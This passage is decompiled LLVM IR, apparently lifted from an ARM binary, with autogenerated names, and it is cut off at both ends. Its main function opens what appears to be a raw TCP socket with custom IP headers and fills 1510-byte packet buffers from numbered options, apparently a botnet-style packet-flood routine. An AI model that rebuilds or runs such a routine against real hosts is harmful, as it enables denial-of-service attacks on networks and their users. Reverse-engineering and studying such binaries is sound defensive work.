  %v0_b9d8 = load i32, i32* @r8, align 4
  store i32 %v0_b9d8, i32* %r2.global-to-local, align 4
  %v0_b9dc = load i32, i32* @sl, align 4
  store i32 %v0_b9dc, i32* %r3.global-to-local, align 4
  %v0_b9e0 = load i32, i32* @r4, align 4
  store i32 %v0_b9e0, i32* %r0.global-to-local, align 4
  %v4_b9e4 = call i32 @function_cf44(i32 %v0_b9e0, i32 %v0_b9d0, i32 %v0_b9d8, i32 %v0_b9dc)
  %v5_b9e4 = trunc i32 %v4_b9e4 to i16
  store i32 %v4_b9e4, i32* %r0.global-to-local, align 4
  %v3_b9e8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b9e8, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_b9f0 = mul i32 %v3_b9e8, 32
  store i32 %v3_b9f0, i32* %lr.global-to-local, align 4
  %v3_b9f4 = load i32, i32* @r5, align 4
  %v4_b9f4 = add i32 %v3_b9f4, 16
  %v5_b9f4 = inttoptr i32 %v4_b9f4 to i16*
  store i16 %v5_b9e4, i16* %v5_b9f4, align 2
  %v0_b9f8 = load i32, i32* %lr.global-to-local, align 4
  %v1_b9f8 = load i32, i32* %r3.global-to-local, align 4
  %tmp105 = mul i32 %v1_b9f8, -8
  %v5_b9f8 = add i32 %v0_b9f8, %tmp105
  store i32 %v5_b9f8, i32* %lr.global-to-local, align 4
  %v0_b9fc = load i32, i32* @r5, align 4
  %v1_b9fc = add i32 %v0_b9fc, 2
  %v2_b9fc = inttoptr i32 %v1_b9fc to i16*
  %v3_b9fc = load i16, i16* %v2_b9fc, align 2
  %v1_ba00 = load i32, i32* %ip.global-to-local, align 4
  %v2_ba00 = add i32 %v1_ba00, %v5_b9f8
  store i32 %v2_ba00, i32* @lr, align 4
  %v3_ba04 = add i32 %v2_ba00, 2
  %v4_ba04 = inttoptr i32 %v3_ba04 to i16*
  store i16 %v3_b9fc, i16* %v4_ba04, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_ba10 = load i32, i32* @r4, align 4
  store i32 %v0_ba10, i32* %r1.global-to-local, align 4
  %v0_ba14 = load i32, i32* @sb, align 4
  store i32 %v0_ba14, i32* %r0.global-to-local, align 4
  %v0_ba18 = load i32, i32* @r7, align 4
  store i32 %v0_ba18, i32* %r2.global-to-local, align 4
  %v0_ba1c = load i32, i32* @lr, align 4
  %v6_ba24 = call i32 @function_10d6c(i32 %v0_ba14, i32 %v0_ba10, i32 %v0_ba18, i32 16384, i32 %v0_ba1c, i32 16)
  %v3_ba28 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ba28, i32* %r3.global-to-local, align 4
  %v1_ba2c = add i32 %v3_ba28, 1
  store i32 %v1_ba2c, i32* %r0.global-to-local, align 4
  %v0_ba30 = load i32, i32* @r6, align 4
  %v9_ba30 = icmp eq i32 %v0_ba30, %v1_ba2c
  store i1 %v9_ba30, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ba2c, i32* %stack_var_-44, align 4
  %v8_ba38 = icmp sgt i32 %v0_ba30, %v1_ba2c
  br i1 %v8_ba38, label %dec_label_pc_b944, label %dec_label_pc_ba3c

dec_label_pc_ba3c:                                ; preds = %dec_label_pc_b96c
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_ba40 = icmp eq i32 %v0_ba30, 0
  store i1 %v2_ba40, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ba40, label %dec_label_pc_b930, label %dec_label_pc_b940

dec_label_pc_ba50:                                ; preds = %dec_label_pc_b944
  %v0_ba50 = call i32 @function_e7dc()
  %v1_ba50 = trunc i32 %v0_ba50 to i16
  store i32 %v0_ba50, i32* %r0.global-to-local, align 4
  store i32 %v1_b484, i32* %r3.global-to-local, align 4
  store i1 %v2_ba58, i1* %cpsr_z.global-to-local, align 1
  %v3_ba5c = load i32, i32* @r4, align 4
  %v4_ba5c = add i32 %v3_ba5c, 4
  %v5_ba5c = inttoptr i32 %v4_ba5c to i16*
  store i16 %v1_ba50, i16* %v5_ba5c, align 2
  br i1 %v2_ba58, label %dec_label_pc_b96c, label %dec_label_pc_ba50.dec_label_pc_ba64_crit_edge

dec_label_pc_ba50.dec_label_pc_ba64_crit_edge:    ; preds = %dec_label_pc_ba50
  %v0_ba64.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ba64

dec_label_pc_ba64:                                ; preds = %dec_label_pc_ba50.dec_label_pc_ba64_crit_edge, %dec_label_pc_b960
  %v0_ba64 = phi i32 [ %v0_ba64.pre, %dec_label_pc_ba50.dec_label_pc_ba64_crit_edge ], [ %v7_b94c, %dec_label_pc_b960 ]
  %v1_ba64 = add i32 %v0_ba64, 40
  store i32 %v1_ba64, i32* %r0.global-to-local, align 4
  store i32 %v6_b464, i32* %r1.global-to-local, align 4
  %v2_ba6c = inttoptr i32 %v1_ba64 to i16*
  %v3_ba6c = call i32 @function_e9dc(i16* %v2_ba6c, i32 %v6_b464)
  store i32 %v3_ba6c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b96c

; uselistorder directives
  uselistorder i32 %v0_ba50, { 1, 0 }
  uselistorder i32 %v1_ba2c, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_b9f8, { 1, 0 }
  uselistorder i32 %v4_b9e4, { 1, 0 }
  uselistorder i32 %v3_b9b0, { 1, 0 }
  uselistorder i32 %v3_b990, { 3, 2, 0, 1 }
  uselistorder i32 %v2_b97c, { 1, 0 }
  uselistorder i1 %v2_ba58, { 2, 3, 1, 0 }
  uselistorder i32 %v0_b868, { 1, 0 }
  uselistorder i32 %v0_b7a0, { 1, 0 }
  uselistorder i32 %v5_b734, { 1, 0 }
  uselistorder i32 %v0_b6f4, { 1, 0 }
  uselistorder i32 %v0_b6b0, { 1, 2, 0, 3 }
  uselistorder i32 %v1_b660, { 1, 0, 2, 3 }
  uselistorder i32 %v3_b64c, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_b5d8, { 1, 0 }
  uselistorder i32 %v6_b5d0, { 0, 2, 1, 3 }
  uselistorder i1 %v9_b600, { 1, 0 }
  uselistorder i32 %v4_b614, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_b55c, { 1, 0, 2 }
  uselistorder i32 %v0_b70c, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_b54c, { 1, 0 }
  uselistorder i1 %v7_b544, { 1, 0, 2 }
  uselistorder i1 %v7_b4f8, { 1, 0 }
  uselistorder i32 %v3_b4f4, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_b8d4, { 1, 0 }
  uselistorder i32 %v1_b8bc, { 1, 0 }
  uselistorder i32 %v1_b8a4, { 1, 0 }
  uselistorder i32 %v1_b88c, { 1, 0 }
  uselistorder i32 %v1_b874, { 1, 0 }
  uselistorder i32 %v3_b60c, { 1, 0 }
  uselistorder i1 %v2_b628, { 1, 0 }
  uselistorder i32 %v1_b624, { 1, 0 }
  uselistorder i32 %v4_b620, { 2, 0, 1 }
  uselistorder i32 %v2_b534, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_b4d0, { 1, 0 }
  uselistorder i1 %v7_b4c8, { 1, 0 }
  uselistorder i1 %v7_b49c, { 1, 0 }
  uselistorder i32 %v3_b498, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_b484, { 2, 3, 1, 0 }
  uselistorder i32 %v6_b464, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_b44c, { 1, 0 }
  uselistorder i32 %v1_b42c, { 1, 0 }
  uselistorder i32 %v1_b40c, { 1, 0 }
  uselistorder i32 %v1_b3ec, { 1, 0 }
  uselistorder i32 %v1_b3cc, { 1, 0 }
  uselistorder i32 %v1_b3ac, { 1, 0 }
  uselistorder i32 %v6_b388, { 1, 0 }
  uselistorder i32 %v1_b370, { 1, 0 }
  uselistorder i8 %v5_b328, { 1, 0 }
  uselistorder i32 %v6_b308, { 1, 0 }
  uselistorder i32 %v2_b2f0, { 0, 3, 1, 2 }
  uselistorder i32 %v2_b2e0, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 45, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 46, 45, 47, 49, 48, 50, 52, 51, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 6, 9, 8, 11, 10, 16, 12, 13, 14, 15, 19, 17, 18, 21, 20, 22, 25, 24, 23, 26, 27, 28, 30, 31, 29, 32, 34, 33, 35, 36, 37, 39, 38, 40, 42, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 0, 16, 17, 14, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b96c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b940, { 1, 0 }
  uselistorder label %dec_label_pc_b930, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b920, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %dec_label_pc_b68c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b65c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b598, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_b578, { 1, 0 }
  uselistorder label %dec_label_pc_b554, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_b504, { 1, 0 }
  uselistorder label %dec_label_pc_b4e8, { 1, 0 }
}

define i32 @function_ba78(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_ba78:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_ba78 = load i32, i32* @sb, align 4
  %v24_ba78 = load i32, i32* @fp, align 4
  %v27_ba78 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_ba94 = call i32 @function_11958(i32 %arg1, i32 4)
  %v0_ba98 = load i32, i32* @r5, align 4
  store i32 %v0_ba98, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_baa8 = load i32, i32* @r4, align 4
  store i32 %v0_baa8, i32* %r0.global-to-local, align 4
  %v5_baac = inttoptr i32 %v0_ba98 to i32*
  %v6_baac = call i32 @function_a300(i32 %v0_baa8, i32* %v5_baac, i32 2, i32 0)
  %v1_bab8 = urem i32 %v6_baac, 256
  store i32 %v1_bab8, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_bac4 = load i32, i32* @r5, align 4
  store i32 %v0_bac4, i32* %r1.global-to-local, align 4
  %v0_bac8 = load i32, i32* @r4, align 4
  store i32 %v0_bac8, i32* %r0.global-to-local, align 4
  %v6_bad0 = inttoptr i32 %v0_bac4 to i32*
  %v7_bad0 = call i32 @function_a300(i32 %v0_bac8, i32* %v6_bad0, i32 3, i32 65535)
  %v0_bad4 = load i32, i32* @r5, align 4
  store i32 %v0_bad4, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_bad0, i32* %sb.global-to-local, align 4
  %v0_bae4 = load i32, i32* @r4, align 4
  store i32 %v0_bae4, i32* %r0.global-to-local, align 4
  %v4_bae8 = inttoptr i32 %v0_bad4 to i32*
  %v5_bae8 = call i32 @function_a300(i32 %v0_bae4, i32* %v4_bae8, i32 4, i32 64)
  %v1_baf0 = urem i32 %v5_bae8, 256
  store i32 %v1_baf0, i32* %ip.global-to-local, align 4
  %v0_baf4 = load i32, i32* @r5, align 4
  store i32 %v0_baf4, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bb00 = load i32, i32* @r4, align 4
  store i32 %v0_bb00, i32* %r0.global-to-local, align 4
  %v6_bb08 = inttoptr i32 %v0_baf4 to i32*
  %v7_bb08 = call i32 @function_a300(i32 %v0_bb00, i32* %v6_bb08, i32 5, i32 0)
  %v1_bb14 = urem i32 %v7_bb08, 256
  store i32 %v1_bb14, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_bb20 = load i32, i32* @r5, align 4
  store i32 %v0_bb20, i32* %r1.global-to-local, align 4
  %v0_bb24 = load i32, i32* @r4, align 4
  store i32 %v0_bb24, i32* %r0.global-to-local, align 4
  %v5_bb2c = inttoptr i32 %v0_bb20 to i32*
  %v6_bb2c = call i32 @function_a300(i32 %v0_bb24, i32* %v5_bb2c, i32 6, i32 65535)
  %v0_bb34 = load i32, i32* @r5, align 4
  store i32 %v0_bb34, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_bb2c, i32* @r6, align 4
  %v0_bb44 = load i32, i32* @r4, align 4
  store i32 %v0_bb44, i32* %r0.global-to-local, align 4
  %v4_bb48 = inttoptr i32 %v0_bb34 to i32*
  %v5_bb48 = call i32 @function_a300(i32 %v0_bb44, i32* %v4_bb48, i32 7, i32 65535)
  %v0_bb50 = load i32, i32* @r5, align 4
  store i32 %v0_bb50, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_bb48, i32* @sl, align 4
  %v0_bb60 = load i32, i32* @r4, align 4
  store i32 %v0_bb60, i32* %r0.global-to-local, align 4
  %v4_bb64 = inttoptr i32 %v0_bb50 to i32*
  %v5_bb64 = call i32 @function_a300(i32 %v0_bb60, i32* %v4_bb64, i32 17, i32 65535)
  %v0_bb70 = load i32, i32* @r5, align 4
  store i32 %v0_bb70, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_bb7c = load i32, i32* @r4, align 4
  store i32 %v0_bb7c, i32* %r0.global-to-local, align 4
  %v5_bb80 = inttoptr i32 %v0_bb70 to i32*
  %v6_bb80 = call i32 @function_a300(i32 %v0_bb7c, i32* %v5_bb80, i32 18, i32 65535)
  %v0_bb84 = load i32, i32* @r5, align 4
  store i32 %v0_bb84, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bb94 = load i32, i32* @r4, align 4
  store i32 %v0_bb94, i32* %r0.global-to-local, align 4
  %v5_bb98 = inttoptr i32 %v0_bb84 to i32*
  %v6_bb98 = call i32 @function_a300(i32 %v0_bb94, i32* %v5_bb98, i32 11, i32 0)
  %v0_bb9c = load i32, i32* @r5, align 4
  store i32 %v0_bb9c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bbac = load i32, i32* @r4, align 4
  store i32 %v0_bbac, i32* %r0.global-to-local, align 4
  %v5_bbb0 = inttoptr i32 %v0_bb9c to i32*
  %v6_bbb0 = call i32 @function_a300(i32 %v0_bbac, i32* %v5_bbb0, i32 12, i32 1)
  %v0_bbb4 = load i32, i32* @r5, align 4
  store i32 %v0_bbb4, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bbc4 = load i32, i32* @r4, align 4
  store i32 %v0_bbc4, i32* %r0.global-to-local, align 4
  %v5_bbc8 = inttoptr i32 %v0_bbb4 to i32*
  %v6_bbc8 = call i32 @function_a300(i32 %v0_bbc4, i32* %v5_bbc8, i32 13, i32 0)
  %v0_bbcc = load i32, i32* @r5, align 4
  store i32 %v0_bbcc, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bbdc = load i32, i32* @r4, align 4
  store i32 %v0_bbdc, i32* %r0.global-to-local, align 4
  %v5_bbe0 = inttoptr i32 %v0_bbcc to i32*
  %v6_bbe0 = call i32 @function_a300(i32 %v0_bbdc, i32* %v5_bbe0, i32 14, i32 0)
  %v0_bbe4 = load i32, i32* @r5, align 4
  store i32 %v0_bbe4, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bbf4 = load i32, i32* @r4, align 4
  store i32 %v0_bbf4, i32* %r0.global-to-local, align 4
  %v5_bbf8 = inttoptr i32 %v0_bbe4 to i32*
  %v6_bbf8 = call i32 @function_a300(i32 %v0_bbf4, i32* %v5_bbf8, i32 15, i32 0)
  %v0_bbfc = load i32, i32* @r5, align 4
  store i32 %v0_bbfc, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc0c = load i32, i32* @r4, align 4
  store i32 %v0_bc0c, i32* %r0.global-to-local, align 4
  %v5_bc10 = inttoptr i32 %v0_bbfc to i32*
  %v6_bc10 = call i32 @function_a300(i32 %v0_bc0c, i32* %v5_bc10, i32 16, i32 0)
  %v0_bc14 = load i32, i32* @r5, align 4
  store i32 %v0_bc14, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_bc24 = load i32, i32* @r4, align 4
  store i32 %v0_bc24, i32* %r0.global-to-local, align 4
  %v5_bc28 = inttoptr i32 %v0_bc14 to i32*
  %v6_bc28 = call i32 @function_a300(i32 %v0_bc24, i32* %v5_bc28, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bc38 = load i32, i32* @r5, align 4
  store i32 %v0_bc38, i32* %r1.global-to-local, align 4
  %v0_bc3c = load i32, i32* @r4, align 4
  store i32 %v0_bc3c, i32* %r0.global-to-local, align 4
  %v4_bc40 = inttoptr i32 %v0_bc38 to i32*
  %v5_bc40 = call i32 @function_a300(i32 %v0_bc3c, i32* %v4_bc40, i32 1, i32 1)
  %v2_bc4c = load i32, i32* @global_var_20600.75, align 4
  store i32 %v2_bc4c, i32* %r3.global-to-local, align 4
  %v1_bc50 = urem i32 %v5_bc40, 256
  store i32 %v1_bc50, i32* %ip.global-to-local, align 4
  %v0_bc54 = load i32, i32* @r5, align 4
  store i32 %v0_bc54, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_bc5c = load i32, i32* @r4, align 4
  store i32 %v0_bc5c, i32* %r0.global-to-local, align 4
  %v5_bc64 = inttoptr i32 %v0_bc54 to i32*
  %v6_bc64 = call i32 @function_a294(i32 %v0_bc5c, i32* %v5_bc64, i32 25, i32 %v2_bc4c, i32 %v1_bc50)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_bc78 = call i32 @function_10df0(i32 2, i32 3, i32 6)
  store i32 %v3_bc78, i32* %r0.global-to-local, align 4
  %v7_bc7c = icmp eq i32 %v3_bc78, -1
  store i1 %v7_bc7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bc7c, label %dec_label_pc_c144, label %dec_label_pc_bc88

dec_label_pc_bc88:                                ; preds = %dec_label_pc_ba78
  store i32 1, i32* %stack_var_-44, align 4
  %v6_bc90 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_bc90, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_bca4 = call i32 @function_10dac(i32 %v3_bc78, i32 0, i32 3, i32 %v6_bc90, i32 4)
  store i32 %v5_bca4, i32* %r0.global-to-local, align 4
  %v7_bca8 = icmp eq i32 %v5_bca4, -1
  store i1 %v7_bca8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bca8, label %dec_label_pc_c13c, label %dec_label_pc_bcb0

dec_label_pc_bcb0:                                ; preds = %dec_label_pc_bc88
  %v0_bcb0 = load i32, i32* %sb.global-to-local, align 4
  %v3_bcb0 = mul i32 %v0_bcb0, 65536
  store i32 %v3_bcb0, i32* @r5, align 4
  %v0_bcb4 = load i32, i32* @r6, align 4
  %v0_bcb8 = load i32, i32* @sl, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_bcc0 = urem i32 %v0_bcb0, 65536
  store i32 %v3_bcc0, i32* %r1.global-to-local, align 4
  %v3_bcc4 = urem i32 %v0_bcb4, 65536
  store i32 %v3_bcc4, i32* %r2.global-to-local, align 4
  %v3_bcc8 = urem i32 %v0_bcb8, 65536
  store i32 %v3_bcc8, i32* %r3.global-to-local, align 4
  %v0_bccc = load i32, i32* @r7, align 4
  %v2_bccc = icmp eq i32 %v0_bccc, 0
  store i1 %v2_bccc, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bccc, label %dec_label_pc_c150, label %dec_label_pc_bce4

dec_label_pc_bce4:                                ; preds = %dec_label_pc_bcb0
  %v3_bce8 = mul i32 %v6_bc28, 65536
  %v1_bcec = add i32 %v3_bce8, 2621440
  store i32 %v1_bcec, i32* @lr, align 4
  %tmp59 = mul i32 %v0_bcb4, 256
  %v3_bd10 = and i32 %tmp59, 65280
  %tmp60 = mul i32 %v0_bcb8, 256
  %v3_bd14 = and i32 %tmp60, 65280
  %tmp61 = udiv i32 %v0_bcb4, 256
  %v4_bd18 = urem i32 %tmp61, 256
  %v5_bd18 = or i32 %v4_bd18, %v3_bd10
  store i32 %v5_bd18, i32* @r6, align 4
  %tmp62 = udiv i32 %v0_bcb8, 256
  %v4_bd1c = urem i32 %tmp62, 256
  %v5_bd1c = or i32 %v4_bd1c, %v3_bd14
  store i32 %v5_bd1c, i32* @sl, align 4
  %tmp63 = udiv i32 %v1_bcec, 256
  %v3_bd30 = and i32 %tmp63, 65280
  %tmp64 = mul i32 %v0_bcb0, 256
  %v3_bd34 = and i32 %tmp64, 65280
  %tmp65 = mul i32 %v5_bb64, 256
  %v3_bd38 = and i32 %tmp65, 65280
  %v1_bd3c = urem i32 %v6_bb98, 2
  %v1_bd40 = urem i32 %v6_bbb0, 2
  %tmp66 = udiv i32 %v5_bb64, 256
  %v4_bd44 = urem i32 %tmp66, 256
  %v5_bd44 = or i32 %v4_bd44, %v3_bd38
  %v4_bd48 = udiv i32 %v1_bcec, 16777216
  %v5_bd48 = or i32 %v3_bd30, %v4_bd48
  store i32 %v5_bd48, i32* @sb, align 4
  %tmp67 = udiv i32 %v0_bcb0, 256
  %v4_bd4c = urem i32 %tmp67, 256
  %v5_bd4c = or i32 %v4_bd4c, %v3_bd34
  store i32 %v5_bd4c, i32* @fp, align 4
  %v1_bd68 = urem i32 %v6_bbc8, 2
  store i32 %v1_bd68, i32* %r2.global-to-local, align 4
  %v1_bd6c = urem i32 %v6_bbe0, 2
  store i32 %v1_bd6c, i32* %r3.global-to-local, align 4
  %v1_bd70 = urem i32 %v6_bbf8, 2
  store i32 %v1_bd70, i32* %ip.global-to-local, align 4
  %v1_bd74 = urem i32 %v6_bc10, 2
  store i32 %v1_bd74, i32* %r0.global-to-local, align 4
  %v1_bd78 = urem i32 %v6_bbc8, 256
  store i32 %v1_bd78, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %sext = mul i32 %v6_baac, 16777216
  %v4_bdec = sdiv i32 %sext, 16777216
  %sext3 = mul i32 %v5_bae8, 16777216
  %v4_bdf8 = sdiv i32 %sext3, 16777216
  %tmp = sub nsw i32 0, %v1_bd40
  %v4_be64 = and i32 %tmp, 16
  %tmp72 = sub nsw i32 0, %v1_bd68
  %v4_be80 = and i32 %tmp72, 8
  %tmp73 = sub nsw i32 0, %v1_bd6c
  %v4_be94 = and i32 %tmp73, 4
  %tmp74 = sub nsw i32 0, %v1_bd70
  %v3_bea8 = and i32 %tmp74, 2
  %v2_becc = icmp eq i32 %v1_bd78, 0
  %v1_bdf4 = trunc i32 %v4_bdec to i8
  %extract.t = trunc i32 %v4_bdf8 to i8
  br label %dec_label_pc_bd98

dec_label_pc_bd98:                                ; preds = %bb70, %dec_label_pc_bce4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_bda4 = call i32 @function_11958(i32 1510, i32 1)
  store i32 %v2_bda4, i32* %r0.global-to-local, align 4
  %v2_bdac = load i32, i32* @r4, align 4
  %v5_bdac = mul i32 %v2_bdac, 4
  %v6_bdac = add i32 %v5_bdac, %v2_ba94
  %v7_bdac = inttoptr i32 %v6_bdac to i32*
  store i32 %v2_bda4, i32* %v7_bdac, align 4
  %v3_bdb0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bdb0, i32* %r2.global-to-local, align 4
  %v5_bdb8 = mul i32 %v3_bdb0, 24
  %v1_bdbc = load i32, i32* @r8, align 4
  %v2_bdbc = add i32 %v1_bdbc, %v5_bdb8
  store i32 %v2_bdbc, i32* %r1.global-to-local, align 4
  store i32 %v2_ba94, i32* %r3.global-to-local, align 4
  %v4_bdc4 = mul i32 %v3_bdb0, 4
  %v5_bdc4 = add i32 %v4_bdc4, %v2_ba94
  %v6_bdc4 = inttoptr i32 %v5_bdc4 to i32*
  %v7_bdc4 = load i32, i32* %v6_bdc4, align 4
  store i32 %v7_bdc4, i32* @r5, align 4
  %v1_bdc8 = inttoptr i32 %v7_bdc4 to i8*
  %v2_bdc8 = load i8, i8* %v1_bdc8, align 1
  %tmp75 = urem i8 %v2_bdc8, 16
  %v1_bdcc = zext i8 %tmp75 to i32
  %v1_bdd0 = or i32 %v1_bdcc, 64
  store i32 %v1_bdd0, i32* %r3.global-to-local, align 4
  %v1_bdd4 = trunc i32 %v1_bdd0 to i8
  store i8 %v1_bdd4, i8* %v1_bdc8, align 1
  %v0_bdd8 = load i32, i32* @r5, align 4
  %v1_bdd8 = inttoptr i32 %v0_bdd8 to i8*
  %v2_bdd8 = load i8, i8* %v1_bdd8, align 1
  %v1_bddc = and i8 %v2_bdd8, -16
  %v1_bde0 = or i8 %v1_bddc, 5
  store i32 %v1_bb14, i32* %ip.global-to-local, align 4
  store i8 %v1_bde0, i8* %v1_bdd8, align 1
  store i32 %v4_bdec, i32* %r0.global-to-local, align 4
  %v0_bdf0 = load i32, i32* %ip.global-to-local, align 4
  %v2_bdf0 = icmp eq i32 %v0_bdf0, 0
  store i1 %v2_bdf0, i1* %cpsr_z.global-to-local, align 1
  %v2_bdf4 = load i32, i32* @r5, align 4
  %v3_bdf4 = add i32 %v2_bdf4, 1
  %v4_bdf4 = inttoptr i32 %v3_bdf4 to i8*
  store i8 %v1_bdf4, i8* %v4_bdf4, align 1
  store i32 %v4_bdf8, i32* %r2.global-to-local, align 4
  %v0_bdfc = load i1, i1* %cpsr_z.global-to-local, align 1
